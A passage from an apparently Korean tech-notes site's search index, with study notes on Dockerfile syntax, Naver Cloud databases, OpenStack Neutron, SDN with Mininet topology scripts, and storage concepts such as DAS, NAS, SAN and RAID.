이메일 정보를 기입합니다. 필수사항은 아닙니다.     COPY  COPY \u0026lt;src\u0026gt;... \u0026lt;dest\u0026gt; COPY . /usr/src/app  파일이나 디렉토리를 이미지로 복사합니다. 일반적으로 소스를 복사하는 데 사용하며 target 디렉토리가 없다면 자동으로 생성됩니다.     ADD  ADD \u0026lt;src\u0026gt;... \u0026lt;dest\u0026gt; ADD . /usr/src/app  COPY 명령어와 유사하나 src에 파일 대신 URL을 입력할 수 있고 src에 압축 파일을 입력하는 경우 자동으로 압축을 해제하면서 복사됩니다.     RUN  RUN \u0026lt;command\u0026gt; RUN apt-get -y update  가장 많이 사용되는 구문으로 명령어를 그대로 실행합니다. 내부적으로 \u0026lsquo;/bin/sh -c\u0026rsquo; 뒤에 실행되는 방식     CMD  CMD [\u0026#34;executable\u0026#34;, \u0026#34;param1\u0026#34;, \u0026#34;param2\u0026#34;] CMD command param1 param2 CMD bundle exec ruby app.rb   도커 컨테이너가 실행되었을 때 실행되는 명령어를 정의합니다.\n  빌드할 때는 실행되지 않으며 여러 개의 CMD가 존재할 경우 마지막 CMD만 실행되며 한꺼번에 여러 개의 프로그램을 실행하고 싶은 경우에는 run.sh파일을 작성하여 데몬으로 실행하거\u0026gt;나 supervisord나 forego와 같은 여러 개의 프로그램을 실행하는 프로그램을 사용\n     WORKDIR  WORKDIR /path/to/workdir   RUN, CMD, ADD, COPY 등이 이루어질 기본 디렉토리를 설정합니다. 각 명령어의 현재 디렉토리ㅣ 한 ㅈ루 한줄 마다 초기화되기 때문에 RUN cd /path를 하더라도 다음 명령어에선 다시 위치가 초기화 됩니다.\n  같은 디렉톨에서 계속 잡업하기 위해서는 WORKDIR을 사용합니다.\n     EXPOSE  EXPOSE \u0026lt;port\u0026gt; [\u0026lt;port\u0026gt;...] EXPOSE 4567  도커 컨테이너가 실행되었을 때 요청을 기다리고 있는(Listen) 포트를 지정합니다. 여러 포트의 지정이 가능합니다.     Volume  VOLUME [\u0026#34;/data\u0026#34;]   컨테이너 외부에 파일시스템을 마운트 할 때 사용합니다.\n  반드시 지정하지 않아도 마운트 할 수 있지만, 기본적으로 지정하는 것이 좋음\n     ENV  ENV \u0026lt;key\u0026gt; \u0026lt;value\u0026gt; ENV \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; ... ENV DB_URL mysql  컨테이너에서 사용할 환경변수를 지정합니다. 컨테이너를 실행할 때 -e 옵션을 사용하면 기존 값을 오버라이딩 하게 됩니다.     qq  \u0026lt;OPTION\u0026gt; -qq ...  -qq를 추가하게되면 생성시 로그가 출력되지 않게 됩니다.     Docker bulid 확인하기 root@ubuntu:~/docker/my# sudo docker build -t mydocker .\rSending build context to Docker daemon 2.048kB\r# 작업을 위해 도커 서버로 현재 파일 (build context)를 도커 서버로 전송합니다.\rStep 1/7 : FROM ubuntu:18.04\r# 전송 작업이 완료되면 Dockerfile에 따라 명령을 위에서 부터 한줄씩 수행합니다.\r# 컨테이너의 OS를 다운받는 작업입니다.\r18.04: Pulling from library/ubuntu\r...\r...\rStatus: Downloaded newer image for ubuntu:18.04\r---\u0026gt; 6526a1858e5d\r# 명령어 수행 결과를 이미지로 저장합니다. Ubuntu:18.04의 이미지 ID가 표시됩니다.\rStep 2/7 : MAINTAINER mung0001@mung0001.github.io\r---\u0026gt; Running in 9a1e3f5ce61f\r# Dokerfile의 MAINTAINER 명령을 수행합니다.\rRemoving intermediate container 9a1e3f5ce61f\r---\u0026gt; a95d39eb9fe3\r# 명령어를 수행하기 위해 이전에 생성된 이미지를 기반으로 컨테이너를 임시로 생성합니다.\r# 명령어를 수행하기 위해 이미로 생성했던 컨테이너를 제거합니다.\rStep 3/7 : RUN apt-get -y update\r---\u0026gt; Running in 20d67e992832\r# Dockerfile의 RUN 명령어를 수행하기 위해 컨테이너를 임시로 만들고 명령어를 실행하여 그 결과를 이미지로 만듭니다.\r# 이 과정을 마지막 줄 까지 반복합니다.\r...\r...\rRemoving intermediate container 20d67e992832\r---\u0026gt; 709b42fd66a2\rStep 4/7 : RUN apt-get -y upgrade\r---\u0026gt; Running in f690af581ee2\r# # Dockerfile의 RUN 명령어를 수행하기 위해 컨테이너를 임시로 만들고 명령어를 실행하여 그 결과를 이미지로 만듭니다.\rRemoving intermediate container f690af581ee2\r---\u0026gt; c393731a3316\rStep 5/7 : RUN apt-get -y install apache2\r---\u0026gt; Running in 45fe0cf861f3\rRemoving intermediate container 45fe0cf861f3\r---\u0026gt; cea18245265b\r# 컨테이너를 생성하여 새로운 이미지 생성 -\u0026gt; 전 이미지 삭제를 반복합니다.\rStep 6/7 : RUN echo Hello \u0026gt; /var/www/html/index.html\r---\u0026gt; Running in e8b2d8f67e5e\rRemoving intermediate container e8b2d8f67e5e\r---\u0026gt; 69acfc988c52\rStep 7/7 : EXPOSE 80\r---\u0026gt; Running in 6cac5d6f0c76\rRemoving intermediate container 6cac5d6f0c76\r---\u0026gt; b0c87051e253\rSuccessfully built b0c87051e253\rSuccessfully tagged mydocker:latest\r# mydocker:latest가 생성돠었습니다.\r  "}),a.add({id:100,href:'/docs/gcp/gcptraining/',title:"GCP Training",content:"GCP Training  정리 중 "}),a.add({id:101,href:'/docs/system/macos/',title:"Mac OS",content:"Mac OS    현재 정리하고 있습니다!  "}),a.add({id:102,href:'/docs/ncp/ncptraining/nca05/',title:"Naver Cloud Database",content:"Cloud Database   Naver Cloud 스크립트 파일을 통한 서버 자체에 DB를 설치하는 것외에도 Cloud 상에 MySQL을 사용하는 서비스 또한 지원    Cloud DB for MySQL    자동 Fail-Over 지원 및 사용자 환경에 맞는 구성 기능제공\n  최대 32vCPU에 256GB 메모리 지원, 2TB 자동 디스크 확장 ( Standard, High Memory )\n  자동 Fail-Over를 지원하며 최대 5대까지 복제 Slave (Read Only) 확장가능\n  private Load Balancer를 이용해서 Read 부하 분산 가능\n  자동 백업 주기를 설정할 수 있으며, 최대 30일 백업 파일 보관\n    Master DB Failover\n  콘솔에서 수동으로 Failover에 실행이 가능\n  서비스 오픈 전에 Master DB 장애로 Failover가 발생하는 상황을 재현하여 Application에 영향이 없는 지 사전에 점검이 가능\n    DB Process 모니터링\n  DB Server에 연결하여 수행 중인 Query를 확인할 수 있음\n  Slow Query 로그 외에도 특징 시점에 어떤 Query가 수행 중인지 확인할 수 있어 DB 상태를 점검하는 데 도움을 받을 수 있음\n    Stabd Alone 백업\n  Stabd Alone 서버도 DB 백업을 사용할 수 있음\n  데이터가 삭제되어도 백업 보관일 설정 내에서 백업으로 데이터를 복구 할 수 있음\n       Cloud DB for Redis   자동 복구를 통해 안정적으로 운영되는 완전 관리형 클라우드 인 메모리 캐시 서비스   Redis가 제공하지 않는 자동 Fail-over 기능을 독자적으로 개발하여 제공함으로써 장애발생 시에도 안정적인 서비스 제공\n  설치 후 Redis와 OS모니터링을 이용할 수 있으며 장애 또는 이벤트 발생 시 사용자의 메일, SMS로 장애 알람\n  네이버 서비스에서 오랜 시간 검증된 Redis 설정을 기본으로 지원\n  Redis Cluster은 현재는 미지원\n       Cloud DB for MS-SQL   네이버 서비스에 검증된 최적화된 설정을 통해 안정적으로 운영되며, 장애가 발생하면 다옹으로 복구\n  안정적인 서비스 제공을 위해 장애 발생 시 자동으로 Fail-over 기능 제공 ( Principal DB와 Mirror DB 총 2대 구성 )\n  설치 후 즉시 MSSQL과 OS 모니터링을 이용할 수 있으며, MSSQL의 동작 상황을 그래프를 통해 손쉽게 확인이 가능\n  1분 단위의 쿼리 레벨 성능 분석을 지원하여 서비스 성능과 안정성을 향상\n      "}),a.add({id:103,href:'/docs/ncp/',title:"Naver Cloud Platform",content:""}),a.add({id:104,href:'/docs/openstack/openstack/neutron/',title:"Neutron",content:"네트워크를 관리하는 서비스: Neutron   네트워크를 관리하는 서비스: Neutron  Neutron은 네트워크 서비스로 여러 노드에 여러 프로세스를 배치하는 독립형 서비스 프로세스는 서로 및 다른 OpenStack의 서비스와 상화 작용     Neutron의 논리 아키텍처      구성요소 기능     neutron-server network api의 기능 및 네트워크 확장 기능을 서비스하며, 각 포트의 대한 모델 및 Pfmf 지정, AMQP를 사용하여 데이터베이스와 통신하는 플러그인을 통해 수행   neutron-L2-agent OVS 가상 Bridge 사이에서데이터 패킷을 전달하기 위한 중계장치   neutron-l3-agent 태넌트 네트워크에서 VM의 외부 네트워크 엑세서를 위한 L3/ NAT 전달을 제공   neutron-dhcp-agent 테넌트 네트워크에 DHCP 서비스를 제공, DHCP agent는 메시지 큐에 엑세스할 수 있는 권한이 필요   Queue 다른 서비스 간의 통신의 역할을 수행   Neutron Database Neutron 서비스를 수행하기 위한 일련의 정보들은 보관, 관리하는 DB   Neutron 3rd Party Plugin Neutron 서비스의 안정적인 통신 역할을 수행   plugin agent 각 compute node에서 실행되며 로컬 vswitch을 구성 및 관리   network provider services 테넌트 네트워크에 추가 네트워킹 서비스를 제공      Neutron은 다양한 네트워크 플러그인이나 네트워크 모델을 지원 사용자는 Neutron API를 이용해 neutron-server로 IP 할당을 요청 neutron-server 들어온 요청을 Queue로 다시 요청 Queue는 neutron-dhcp-agent와 Neutron 3rd Party plugin으로 IP 할당 지시를 내림 neutron-dhcp-agent와 Neutron 3rd Party Plugin은 지시 받은 작업 수행을 시작 neutron-server는 수시로 작업 상태를 Neutron database에 저장 할당된 IP를 인스턴스에서 사용 가능     Neutron의 네트워킹 프로세스   neutron-server에 의해 명령을 요청을 받음 plugin을 토대로 Messae queue를 통해 각 agent의 기능을 수행 이와 함께 SDN 서비스를 수행     Neutron network의 종류      네트워크의 종류 기능     Management network OpenStack 구성 요소 간의 내부 통신에 사용, 기본적으로 IP 주소는 데이터 센터 내에서만 사용이 가능   Guest network 클라우드 배포 내에서 인스턴스 데이터 통신에 사용되며, 네트워킹 플러그인 및 테넌트가 만든 가상 네트워크의 구성 선택에 따라 변동   External network 외부에서 인스턴스에 대한 엑세스를 위해 제공되는 네트워크   API network OpneStack API를 외부에 노출시키는 네트워크       Neutron과 VRRP, DVR    VRRP(Virtual Router Redundancy Protocl)로 랜에서 정적으로 설정된 기본 라우터를 사용할 때, 하나 이상의 백업 라우터를 사용하는 방법을 제공하는 인터넷 프로토콜\n  DVR(Distributed Virtual Router)이란 VRRP 기능을 향상시키고, 분산 라우팅 기능과 HA(High Availability), 로드밸런싱 기능을 사용할 수 있음\n  기존 레거시 HA 라우터와 마찬가지로 DVR/ SNAT(Static NAT), HA 라우터는 다른 노드에서 실행되는 L3 Agent의 백업 DVR/ SNAT 라우터에서 SNAT 서비스 장애를 빠르게 해결 가능\n     네트워크 관련 명령어 $ openstack network list # 네트워크 확인 $ openstack network show [네트워크 이름] # 네트워크 정보 조회 $ ip netns # 라우터 정보 조회 $ ip netns exec [라우터이름] [리눅스 명령어] netstat -r arp -an ifconfig ping # 라우터의 자세한 정보 조회 $ openstack network create --provider-network-type [타입] [네트워크 이름] # 네트워크 생성 # openstack subnet create --network [네트워크 이름] --gateway [GW주소] --subnet-range [서브넷 범위] [서브넷 이름 # 서브넷 생성 $ openstack router list # 라우터 목록 확인 $ openstack router show [라우터 이름] # 라우터 정보 조회 $ openstack router add subnet [라우터 이름] [서브넷 이름] # 라우터에 서브넷 추가 $ openstack port create --network [네트워크 이름] --fixed-ip subnet=[서브넷 이름] [포트 이름] # 포트 생성 $ openstack router add port [라우터 이름] [포트 이름] # 라우터에 포트 추가  fixed-ip, floating-ip     IP 역할     Fixed IP 가상머신에 할당되는 내부 IP를 의미   Floating IP 클라우드 내의 가상머신이 인터넷 외부망과 연결되기 위해 배정 받는 IP를 의미     Security Group   인스턴스에 대한 인바운드 및 아웃바운드 트래픽을 제어하는 가상의 네트워크 방화벽 하나의 인스턴스에 여러 개의 보안 그룹 적용도 가능       "}),a.add({id:105,href:'/docs/network/network/sdn/',title:"SDN",content:"SDN   SDN ( Software Defined Networking : 소프트웨어 정의 네트워킹 )    기존의 네트워크 인프라가 가지고 있던 문제를 해결하기 위해서 나온 개념\n  기존의 네트워크 인프라를 구성하는 네트워크 장비들은 하나의 장비에 HW OS APP이 모두 들어가 있었기 때문에 장비 하나하나가 복잡한 기능을 모두 가지고 있었고 장비 자체의 사양도 높아야 했다. 그러다보니 장비마다 비용도 비싸지고 장비를 하나하나 설정해야하는 문제점들이 있었다.\n  SDN은 기존의 장비의 HW와 OS APP 부분을 분리하여 장비 하나하나는 HW부분만을 담당하고 SW적인 부분은 중앙의 컨트롤러에서 제어한다.\n  중앙 컨트롤러에서 모든 것을 제어하기 때문에 네트워크 인프라의 변경이나 확장에 좀 더 유연하게 대처할 수 있다.\n   SDN 구조적 구성요소    SDN Application\n  SDN Controller\n  SDN Datapath\n  SDN Control to Data-Plane Interface ( DPI )\n  SDN Nothbound Interfaces ( NBI )\n   Openflow    OpenFlow는 SDN을 구현하기 위해 처음으로 제정된 표준 인터페이스 ( Protocol )\n  OpenFlow 스위치와 OpenFlow 컨트롤러로 구성되며 흐름(flow) 정보를 제어하여 패킷의 전달 경로 및 방식을 결정한다.\n  OpenFlow 스위치\n  SW : OpenFlow 컨트롤러에게 OpenFlow 프로토콜로 제어 정보를 요청 또는 전달받는 SW\n  HW : OpenFlow 컨트롤러에게 전달받은 정보를 저장하고 해당 정보를 토대로 패킷을 시스템에 전달\n    OpenFlow 컨트롤러\n  OpenFlow 스위치로부터 정보 요청을 받으면 내부에 존재하는 패킷 제어 정보를 확인하고 해당 결과를 OpenFlow 스위치에 전달\n  패킷 제어 정보는 외부의 프로그램에서 API를 통해 입력 가능\n     SDN 환경 구축환경 구축환경 : Vmware\nOS : ubuntu 16.04\napt-get update apt-get install open-vm-tools apt-get install git        Mininet   Mininet 설치   Mininet은 일반 PC에서 쉽게 가상의 네트워크 환경을 구성하여, Openflow를 활용한 SDN과 같은 네트워크 환경을 구성해볼 수 있는 에뮬레이터, 파이썬 API를 지원하여 간단한 프로그래밍으로 네트워크 토폴로지 구성이 가능   \rMininet 설치\r...\r\rgit clone git://github.com/mininet/mininet cd mininet mininet/util/install.sh -a # mininet install git tag # list available versions git checkout -b 2.2.1 2.2.1 # or whatever version you wish to install cd .. \r\r\r\r  미니넷 실행  mn --switch ovs --topo single,3 --test pingall # single의 토폴로지로 3개의 노드를 테스트한다. mn --switch ovs --topo single,3 # single의 토폴로지로 3개의 노드를 실행단다. mininet\u0026gt; h2 ping g3 # 노드간 통신 확인  미니넷 네트워크 토폴로지 종류\n  Single : 하나의 스위치에 N개의 호스트가 연결된 형태\n  Linear : N개의 스위치에 M개의 호스트가 연결된 형태, M을 지정하지 않으면 스위치 하나에 호스트 하나 할당\n  Tree : 지정한 깊이(레벨), fanout(자식)의 트리 형태로 연결됨\n  Torus : N*M 형식으로 연결된 형태\n  \r 네트워크 토폴로지 설정   파이썬을 이용한 방법    mkdir /[ Doc ] cd /[ Doc ]   코드 설명\n Topo 클래스를 상속받은 SingleTopo클래스를정의 addSwitch(\u0026lsquo;스위치명\u0026rsquo;) : 스위치명의 이름으로 스위치 생성 addHost(\u0026lsquo;호스트명\u0026rsquo;) : 호스트명의 이름으로 호스트 생성 addLink(장치1, 장치2) : 장치1과 장치2를 연결하는 링크 생성 dumpNodeConnections() : 스위치 또는 호스트 연결 정보 확인 pingAll() : 모든 호스트들끼리 통신 확인  \r  vi [ File name.py ]   \rCustom topo\r...\r\rfrom mininet.topo import Topo class MyTopo( Topo ): \u0026#34;Simple topology example.\u0026#34; def __init__( self ): \u0026#34;Create custom topo.\u0026#34; # Initialize topology Topo.__init__( self ) # Add hosts and switches leftHost = self.addHost( \u0026#39;h1\u0026#39; ) rightHost = self.addHost( \u0026#39;h2\u0026#39; ) leftSwitch = self.addSwitch( \u0026#39;s3\u0026#39; ) rightSwitch = self.addSwitch( \u0026#39;s4\u0026#39; ) # Add links self.addLink( leftHost, leftSwitch ) self.addLink( leftSwitch, rightSwitch ) self.addLink( rightSwitch, rightHost ) topos = { \u0026#39;mytopo\u0026#39;: ( lambda: MyTopo() ) } \r\r\r\r  \rSingle Code\r...\r\r#-*- coding: utf-8 -*- #!/usr/bin/python from mininet.topo import Topo from mininet.net import Mininet from mininet.util import irange,dumpNodeConnections from mininet.log import setLogLevel from mininet.cli import CLI class SingleTopo(Topo): def __init__(self, k=1, **opts): super(SingleTopo, self).__init__(**opts) switch = self.addSwitch(\u0026#39;s1\u0026#39;) for i in range(1,k+1): host = self.addHost(\u0026#39;h%s\u0026#39; % i) self.addLink(host, switch) def run(self): net = Mininet(self) net.start() dumpNodeConnections(net.hosts) dumpNodeConnections(net.switches) net.pingAll() CLI(net) net.stop()	if __name__ == \u0026#39;__main__\u0026#39;:	setLogLevel(\u0026#39;info\u0026#39;) single = SingleTopo(k=3) single.run() \r\r\r\r   \rn Code\r...\r\r#-*- coding: utf-8 -*- #!/usr/bin/python from mininet.topo import Topo from mininet.net import Mininet from mininet.util import irange,dumpNodeConnections from mininet.log import setLogLevel from mininet.cli import CLI class SingleTopo(Topo): def __init__(self, k=1, **opts): super(SingleTopo, self).__init__(**opts) switch = self.addSwitch(\u0026#39;s1\u0026#39;) for i in range(1,k+1): host = self.addHost(\u0026#39;h%s\u0026#39; % i) self.addLink(host, switch) def run(self): net = Mininet(self) net.start() dumpNodeConnections(net.hosts) dumpNodeConnections(net.switches) net.pingAll() CLI(net) net.stop()	if __name__ == \u0026#39;__main__\u0026#39;:	setLogLevel(\u0026#39;info\u0026#39;) single = SingleTopo(k=3) single.run() \r\r\r\r  python singleDemo.py로 실행 토폴로지가 구성되고 실행된 후 핑 테스트 후 종료    mn 명령어로 파이썬 토폴로지 실행하기   \rmn Code\r...\r\r#-*- coding: utf-8 -*- #!/usr/bin/python from mininet.topo import Topo from mininet.net import Mininet from mininet.util import irange,dumpNodeConnections from mininet.log import setLogLevel class SingleTopo(Topo): def __init__(self, k=1, **opts): super(SingleTopo, self).__init__(**opts) switch = self.addSwitch(\u0026#39;s1\u0026#39;) for i in range(1,k+1): host = self.addHost(\u0026#39;h%s\u0026#39; % i) self.addLink(host, switch) def run(self): net = Mininet(self) net.start() topos = {\u0026#39;mytopo\u0026#39;:( lambda x: SingleTopo(k=x))} 코드 수정 후\n명령어 실행 sudo mn \u0026ndash;custom /sjb/singleDemo.py \u0026ndash;topo mytopo,3\n\r\r\r  Linear 토폴로지 구성  \rLinear Code\r...\r\r#!/usr/bin/python from mininet.topo import Topo from mininet.net import Mininet from mininet.util import irange,dumpNodeConnections from mininet.log import setLogLevel from mininet.cli import CLI class LinearTopo(Topo): def __init__(self, k=1, **opts): super(LinearTopo, self).__init__(**opts) lastSwitch = None for i in range(1,k+1): host = self.addHost(\u0026#39;h%s\u0026#39; % i) switch = self.addSwitch(\u0026#39;s%s\u0026#39; % i) self.addLink(host, switch) if lastSwitch: self.addLink(switch, lastSwitch) lastSwitch = switch def run(self): net = Mininet(self) net.start() dumpNodeConnections(net.hosts) dumpNodeConnections(net.switches) net.pingAll() CLI(net) net.stop()	if __name__ == \u0026#39;__main__\u0026#39;:	setLogLevel(\u0026#39;info\u0026#39;) single = LinearTopo(k=3) single.run() \r\r\r\r Tree 토폴로지 구성  \rTree Code\r...\r\r#!/usr/bin/python from mininet.topo import Topo from mininet.net import Mininet from mininet.util import irange,dumpNodeConnections from mininet.log import setLogLevel from mininet.cli import CLI class TreeTopo(Topo): def __init__(self, **opts): super(TreeTopo, self).__init__(**opts) switch1 = self.addSwitch(\u0026#39;s1\u0026#39;) switch2 = self.addSwitch(\u0026#39;s2\u0026#39;) switch3 = self.addSwitch(\u0026#39;s3\u0026#39;) host1 = self.addHost(\u0026#39;h1\u0026#39;) host2 = self.addHost(\u0026#39;h2\u0026#39;) host3 = self.addHost(\u0026#39;h3\u0026#39;) host4 = self.addHost(\u0026#39;h4\u0026#39;) self.addLink(switch1, switch2) self.addLink(switch1, switch3) self.addLink(host1, switch2) self.addLink(host2, switch2) self.addLink(host3, switch3) self.addLink(host4, switch3) def run(self): net = Mininet(self) net.start() dumpNodeConnections(net.hosts) dumpNodeConnections(net.switches) net.pingAll() CLI(net) net.stop()	if __name__ == \u0026#39;__main__\u0026#39;:	setLogLevel(\u0026#39;info\u0026#39;) single = TreeTopo() single.run() \r\r\r\r   \rTree Code\r...\r\r#!/usr/bin/python from mininet.topo import Topo from mininet.net import Mininet from mininet.util import irange,dumpNodeConnections from mininet.log import setLogLevel class TreeTopo(Topo): def __init__(self, depth=2, **opts): super(TreeTopo, self).__init__(**opts) host=1 for i in range(1, 2**depth): self.addSwitch(\u0026#39;s%s\u0026#39; % i) for i in range(1, 2**depth+1): self.addHost(\u0026#39;h%s\u0026#39; % i) for i in range(1, 2**depth): if i\u0026gt;=2**(depth-1) : p = \u0026#34;s%s\u0026#34; % i c1 = \u0026#34;h%s\u0026#34; % host host+=1 c2 = \u0026#34;h%s\u0026#34; % host host+=1 self.addLink(p, c1) self.addLink(p, c2) else : p = \u0026#34;s%s\u0026#34; % i c1 = \u0026#34;s%s\u0026#34; % (i*2) c2 = \u0026#34;s%s\u0026#34; % (i*2+1) self.addLink(p, c1) self.addLink(p, c2) def run(self): net = Mininet(self) net.start() dumpNodeConnections(net.hosts) dumpNodeConnections(net.switches) net.pingAll() net.stop()	if __name__ == \u0026#39;__main__\u0026#39;:	setLogLevel(\u0026#39;info\u0026#39;) single = TreeTopo(depth=2) single.run() mn \u0026ndash;custom [ py 파일의 경로 ] \u0026ndash;topo mytopo\n  OpenDayLight   GUI 환경    # Initialize topology\rTopo.__init__( self )\r# Add hosts and switches\rh1 = self.addHost( 'h1' )\rh2 = self.addHost( 'h2' )\rh3 = self.addHost( 'h3' )\rh4 = self.addHost( 'h4' )\rs1 = self.addSwitch( 's1' )\rs2 = self.addSwitch( 's2' )\rs3 = self.addSwitch( 's3' )\rs4 = self.addSwitch( 's4' )\r# Add links\rself.addLink( h1, s1 )\rself.addLink( h2, s2 )\rself.addLink( h3, s3 )\rself.addLink( h4, s4 )\rself.addLink( s1, s2 )\rself.addLink( s1, s3 )\rself.addLink( s1, s4 )\rself.addLink( s2, s3 )\rself.addLink( s2, s4 )\rself.addLink( s3, s4 )  \u0026lt;/div\u0026gt;\r \r\r\r "}),a.add({id:106,href:'/docs/development/shell/shell-5/',title:"Shell Script System Management",content:"Shell Programming    Shell System Management         #\n"}),a.add({id:107,href:'/docs/network/sophos/',title:"Sophos",content:"Sophos    Sophos docs\n  Sophos UTM이란?\n  Sophos Install\n  Sophos firewall\n       Sophos Training\n       "}),a.add({id:108,href:'/docs/infra/infra/infra05/',title:"Storage",content:"Storage    Storage Type    일반적으로 데이터를 저장하는 장치를 스토리지라 합니다.\n  스토리지에는 서버 내부의 저장영역인 로컬 스토리지와 서버 외부의 저장 영역인 외부 스토리지가 있습니다.\n  외부 스토리지에는 서버에 직접 연결하는 DAS와 네트워크를 통해 연결하는 NAS, SAN이 있습니다.\n     로컬 스토리지    로컬 스토리지란 서버 내부에 디스크를 설치해서 이용하는 저장 영역을 의미하며, 외부 스토리지를 사용하지 않으므로 설치 공간을 절약할 수 있습니다.\n  단, 외부 스토리지를 이용할 때와 비교해서 설치할 수 있는 디스크의 개수와 확정성이 적은 특징이 있습니다.\n     외부 스토리지   외부 스토리지란 서버 외부에 준비한 스토리지 장비, 혹은 스토리지 영역을 의미하며 세 가지 형태가 존재합니다.     DAS(Direct Attached Storage)\n  DAS는 서버에 직접 연결하는 스토리지 장비로, DAS를 이용하면 로컬 스토리지만으로 용량이 부족할 때 필요한 만큼 디스크 용량을 늘릴 수 있으며, 또한 DAS에는 많은 디스크를 설치할 수 있으므로 스트라이핑 수가 많은 RAID로 구성하여 디스크 I/O 성능을 크게 높일 수 있습니다.\n  운영체제는 DAS에 생성된 논리 드라이브를 내장 디스크의 논리드라이브로 인식하며, 따라서 운영체제는 DAS와 내장 디스크를 구분하지 않으며 동일한 방식으로 다뤄집니다.\n  DAS에서는 서버에 RAID 컨트롤러 보드를 꽂아 연결하는 형태와 HBA(Host Bus Adaptor) 보드를 꽂아 연결하는 형태가 있으며, 전자는 RAID 컨트롤러 보드가 RAID 구성을 관리하지만, 후자는 스토리지에 내장된 RAID 컨트롤러가 RAID 구성을 관리한 것을 의미합니다.\n  DAS를 선택할 때는 필요한 싲레 용량, 성능, 내장애성 및 확장성을 고려해야합니다.\n       NAS(Network Attached Storage)\n  NAS는 네트워크를 통해 여러 대의 서버가 액세스 할 수 있는 스토리지로, 서버와 NAS 간에는 NFS, SMB/CIFS, AFP와 같은 프로토콜을 이용해서 통신을 수행합니다.\n  NAS는 여러 대의 서버에서 데이터를 공유할 때나 여러 대의 서버에서 발생하는 백업 및 로그 파일을 한 군데에 모으는 용도로 주로 사용됩니다.\n       SAN(Storage Area network)\n  SAN은 블록 단위의 데이터 스토리지 전용 네트워크로 고속 및 고품질 환경을 요구하는 환경에서 주로 이용됩니다.\n  SAN은 FC-SAN과 IP-SAN으로 분류되어집니다.\n     FC-SAN(Fibre Channel SAN)\n FC-SAN은 파이버 채널 기반으로 구축된 고속, 고품질 스토리지 전용 네트워크입니다.       IP-SAN(Internet Protocol SAN)\n IP-SAN은 고속, 고품직 통신을 가능하게 하지만 가격이 매우 비싼 특징을 가지고 있습니다.         RAID와 핫 스페어    스토리지 장비에서는 인클로저 안에 디스크를 대량으로 탑재할 수 있게 설계되어 있습니다.\n  인클로저 안에 탑재된 여러 개의 디스크로 RAID를 구성해, 큰 스토리지 영역으로 사용하는 것이 일반적이며, 이 스토리지 영역을 볼륨이라 부릅니다.\n  여러 개의 디스크를 묶어 볼륨으로 사용하면 디스크 하나가 고장나도 RAID로 이중화한 덕에 금방은 서비스에 영향을 받지 않습니다. 고장난 디스크를 즉시 새 디스크로 교환하면 RAID가 리빌드되기 떄문에 스토리지는 다시 정상적인 상태로 복귀할 수 있습니다.\n  하지만 사정이 있으 고장난 디스크를 곧바로 교환할 수 없을 때는 다른 디스크마저 고장나서 RAID 구성이 깨질지도 모르는 위험이 있으며, 이런 경우 핫스페어를 이용하면 효과적으로 이를 해결할 수 있습니다.\n  핫 스페어란 다른 디스크가 망가졌을 때를 위해 대기하는 스탠바이 디스크를 의미하며 핫 스페어가 있으면 스토리지 인클로저가 디스크 고장을 감지했을 때 자동으로 핫스페어가 활성화되어, 고장난 디스크를 대신해 RAID 그룹 안에 적용됩니다.\n  핫 스페어가 활성화되어 RAID 그룹 안에 들어가면, 망가진 디스크는 고장 상태로 처리되어 시스템 상에서 분리되며, 그 자리를 핫 스페어 디스크가 대신합니다. 후에 새로운 디스크를 추가하면 그 디스크가 핫 스페어 디스크가 되어 역할을 수행합니다.\n     외부 스토리지 이용    외부 스토리지의 도입하는 이유는 크게 4가지입니다.\n  저장 영역을 많이 확보\n 데이터 양이 많아 서버의 로컬 스토리지 용량으로 충분하지 않을 경우 저장 영역을 확보를 외부 스토리지에 맡기는 것이 가능합니다.       디스크 I/O 성능증감\n 로컬 디스크의 디스크 I/O이 충분하지 않을 때, 외부 스토리지를 사용하여 디스크 I/O 성능을 향상 시킬 수 있습니다.       스토리지의 통합관리\n 서버별로 중요한 데이터가 분산되어 있으면, 이에 대한 관리가 어려워집니다. 이를 위해 외부 스토리지를 통한 통합관리를 사용할 수 있습니다.       복수의 서버에서의 데이터 공유\n 복수의 서버에서 같은 데이터와 소스 코드를 읽고 쓸 수 있게 하거나, 데이터베이스 클러스터링 환경에서 어느 서버든지 같은 데이터에 액세스할 수 있게 할 때는 NAS를 이용하면 쉽게 구현이 가능합니다.       스토리지의 기능   씬 프로비저닝(Thin Provisioning)    씬 프로비저닝은 물리 스토리지 용량보다 많은 논리 볼륨을 할당할 수 있는 기능입니다.     가상 스토리지를 이용하면 임의의 용량으로 임의의 용량으로 논리 볼륨을 할당할 수 있지만, 일반적으로 물리 스토리지 용량을 상한선으로 하여 할당이 가능합니다.     논리 볼륨을 할당할 때는 용량 부족으로 장애가 일어나지 않도록 안전을 고려해서 실제 사용량보다 크게 할당하는 경우가 많으며, 논리 볼륨을 만들경우 각 논리 볼륨에서 여분으로 확보한 용량이 쌓이고 불필요한 투자가 발생하게 됩니다.\n  이런 경우 씬 프로비저닝를 이용하면 용량만큼의 물리 스토리지를 준비하지 않고도 최소한의 물리 스토리지만을 통해 운용이 가능합니다.\n     자동 계층화\n  자동 계층화는 서로 다른 성능의 디스크를 조합해서 이용 빈도가 높은 데이터는 고가의 빠른 장비에, 이용 빈도가 낮은 데이터는 싸고 느린 장비에 자동으로 저장하는 기능입니다.\n  다양한 계층에 데이터를 자동 저장하는 기법으로는 미리 특정한 규칙을 설정해 두는 방법과 각 파일의 이용 상황을 스토리지가 스스로 판단해서 자동으로 적절한 계층으로 이동시키는 방법 등 제품에 따라 다양한 구현 방식이 존재합니다.\n       디둡(De-duplication)\n  디둡은 스토리지를 백업할 때, 먼저 저장된 데이터가 있으면 그 데이터는 복사하지 안기 때문에 저장 영역을 절약할 수 있는 기능입니다.\n  디둡은 증복 제거 기능이라고도 하며, 몇 세대의 백업을 해 두는 경우 환경에서는 대부분 중복 데이터가 되기에 이를 해결할 수 있습니다.\n       스냅샷\n 스냅샷은 어떤 순간의 파일 시스템의 정지점을 순간적으로 보존해 두는 기능으로, 스냅샷 기능을 실현하기 위해 일반적으로 이용되는 구현 방식은 파일이 갱신될 때마다 갱신 이력과 함께 갱신 전의 파일을 스냅샷용 스토리지 공간에 기록해 가는 방법입니다.      "}),a.add({id:109,href:'/docs/system/window/window05/',title:"파일 및 폴더 관리",content:"파일 및 폴더 관리   확장자 및 숨은 파일 보기   기본적으로 윈도우는 파일확장자 및 숨은 파일들은 표시되어 있게 설정되어있습니다.    이에 대한 설정을 위해 파일 탐색기 \u0026gt; 보기에서 설정하거나 혹은 옵션을 통해 설정합니다.       파일 및 폴더 공유    각 PC들은 네트워크를 통해 파일 